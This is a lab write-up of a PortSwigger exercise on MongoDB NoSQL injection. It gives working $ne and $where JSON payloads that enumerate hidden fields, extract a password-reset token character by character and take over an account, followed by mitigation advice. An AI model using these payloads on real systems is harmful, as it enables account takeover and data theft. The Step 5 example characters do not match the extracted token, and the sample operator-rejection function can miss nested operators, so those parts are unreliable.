# Lab 04: Exploiting NoSQL operator injection to extract unknown fields

> **Topic**: NoSQL Injection
> **Lab Number**: 04
> **Platform**: PortSwigger Web Security Academy

## Category
NoSQL Injection — Operator Injection with `$where` JavaScript Execution for Field Enumeration and Token Extraction

## Vulnerability Summary
The application's login functionality, powered by a MongoDB NoSQL database, is vulnerable to NoSQL operator injection. The `/login` endpoint accepts JSON input and passes it directly into a MongoDB query without sanitization. By injecting the `$ne` operator, the vulnerability is confirmed. More critically, the `$where` operator allows arbitrary JavaScript execution within the database query context. This enables enumeration of unknown field names on the user object and character-by-character extraction of a password reset token. Once the token is recovered, the attacker resets the target user's password and gains full account access.

## Attack Methodology

### Step 1: Confirm `$ne` Operator Injection
Attempted login with username `carlos` and password `invalid`, which returned `Invalid username or password`. Modified the password parameter to use the `$ne` operator:

```json
POST /login
Content-Type: application/json

{"username":"carlos","password":{"$ne":"invalid"}}
```

Response changed to `Account locked: please reset your password`. This confirms the `$ne` operator was accepted — the query matched carlos's account because his password is indeed not equal to `"invalid"`.

### Step 2: Confirm `$where` JavaScript Injection
Added a `$where` clause to test for JavaScript execution:

```json
{"username":"carlos","password":{"$ne":"invalid"},"$where":"0"}
```
Returned `Invalid username or password` (false condition).

```json
{"username":"carlos","password":{"$ne":"invalid"},"$where":"1"}
```
Returned `Account locked` (true condition). This confirms the `$where` JavaScript expression is being evaluated by the database.

### Step 3: Enumerate Field Names
Used `Object.keys(this)` within `$where` to enumerate all fields on the user object. Tested each character position with a regex match:

```javascript
"$where":"Object.keys(this)[1].match('^.{0}u')"
"$where":"Object.keys(this)[1].match('^.{1}s')"
// ... continues character by character
```

Discovered the following fields:
- `[0]` `_id`
- `[1]` `username`
- `[2]` `password`
- `[3]` `email`

Only 4 fields existed — no password reset token field was present initially.

### Step 4: Trigger Password Reset to Create Token Field
Submitted a password reset request for `carlos` via `/forgot-password`. This created a new field on the user object. Re-ran the field enumeration and discovered a 5th field:

- `[4]` `forgotPwd`

This field contains the password reset token value.

### Step 5: Extract the Token Value
Used the same `$where` + regex technique to extract the token value character by character:

```javascript
"$where":"this['forgotPwd'].match('^.{0}7')"
"$where":"this['forgotPwd'].match('^.{1}c')"
// ... continues for all 16 characters
```

Extracted token: `32bac15288ba848b`

### Step 6: Reset Password and Login
Visited the password reset URL with the extracted token:

```
GET /forgot-password?forgotPwd=32bac15288ba848b
```

The reset form used field names `new-password-1` and `new-password-2` (not the obvious `password`/`password-confirm`). Submitted the form with a new password, then logged in as `carlos`. Lab solved.

![screenshot1](screenshot1.png)

## Technical Root Cause

```javascript
// Vulnerable — user input passed directly into MongoDB query
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const user = db.users.findOne({
        username: username,
        password: password,  // no sanitization — attacker sends {"$ne":"invalid"}
        $where: "..."        // JavaScript execution enabled
    });
});
```

Two distinct vulnerabilities chain together:

1. **Operator Injection**: The password field accepts MongoDB operators like `$ne` instead of being treated as a literal string value. This allows authentication bypass when combined with known usernames.

2. **JavaScript Injection via `$where`**: The `$where` operator executes arbitrary JavaScript within the MongoDB query context. This gives the attacker read access to any field on the matched document through `this.fieldName`, enabling data exfiltration even for fields not exposed by the application's normal API.

### Why Field Enumeration Matters

| Field Index | Field Name | Exposed by Application? |
|---|---|---|
| 0 | `_id` | No |
| 1 | `username` | Yes — login form |
| 2 | `password` | Yes — login form |
| 3 | `email` | No |
| 4 | `forgotPwd` | No — only created after reset request |

The `forgotPwd` field is never referenced in any client-side code or API response. Without `$where` injection, an attacker would have no way to discover its existence or read its value.

## Impact
- **Unknown Field Discovery**: Attackers can enumerate all fields on a document, including internal fields not exposed by the application
- **Password Reset Token Theft**: Reset tokens stored on the user object can be extracted, enabling full account takeover
- **Authentication Bypass**: The `$ne` operator alone allows login to any known account without the password
- **Arbitrary Data Exfiltration**: Any field value can be extracted character by character through boolean-based `$where` injection

## Proof of Concept

**Confirm vulnerability:**
```json
POST /login
{"username":"carlos","password":{"$ne":"invalid"},"$where":"1"}
```

**Enumerate field name character at position 0:**
```json
POST /login
{"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this)[4].match('^f')"}
```

**Extract token character at position 0:**
```json
POST /login
{"username":"carlos","password":{"$ne":"invalid"},"$where":"this['forgotPwd'].match('^7')"}
```

**Reset password:**
```
GET /forgot-password?forgotPwd=<extracted_token>
POST /forgot-password (with new-password-1 and new-password-2)
```

## Key Takeaways
1. **`$where` Is a Full JavaScript Interpreter**: It doesn't just evaluate expressions — it gives read access to every field on the matched document. Any field, including internal tokens, can be exfiltrated.
2. **Unknown Fields Are Not Safe**: Developers often assume that fields not exposed in API responses are invisible to attackers. `$where` injection makes the entire document readable.
3. **Triggering State Changes Reveals New Attack Surface**: The `forgotPwd` field didn't exist until a password reset was requested. Attackers should trigger all available workflows and then re-enumerate to find newly created fields.
4. **Form Field Names Matter**: The password reset form used `new-password-1`/`new-password-2` instead of `password`/`password-confirm`. Always inspect the actual form rather than assuming field names.
5. **Operator Injection Is the Entry Point**: The `$ne` operator confirmed the vulnerability and provided the boolean oracle (Account locked vs Invalid username or password) needed for character-by-character extraction.

## Mitigation
1. **Never Pass User Input Directly into MongoDB Queries**: Use parameterized queries with explicit field matching:
   ```javascript
   db.users.findOne({ username: username, password: password })
   ```
   Ensure `username` and `password` are validated as strings, not objects.

2. **Reject Requests Containing MongoDB Operators**:
   ```javascript
   function hasOperators(obj) {
       for (const key of Object.keys(obj)) {
           if (key.startsWith('$')) return true;
           if (typeof obj[key] === 'object') return hasOperators(obj[key]);
       }
       return false;
   }
   ```

3. **Disable `$where` Entirely**: If JavaScript execution is not required, disable the `$where` operator at the database or application level.

4. **Use Strict Input Validation**: Accept only string values for username and password fields. Reject any input that is an object or contains special characters.

5. **Store Reset Tokens Separately**: Password reset tokens should be stored in a separate collection with their own access controls, not on the user document itself.

## References
- [PortSwigger NoSQL Injection Lab - Exploiting NoSQL operator injection to extract unknown fields](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields)
- [PortSwigger NoSQL Injection — What is NoSQL injection?](https://portswigger.net/web-security/nosql-injection)
- [OWASP NoSQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Injection_Prevention_Cheat_Sheet.html)
- [MongoDB $where Operator Documentation](https://www.mongodb.com/docs/manual/reference/operator/query/where/)

## Tools Used
- Burp Suite Professional (Proxy, Repeater)
- Python (requests library for automated extraction)

---

*Lab completed on: 2026-05-15*
*Writeup by vibhxr*
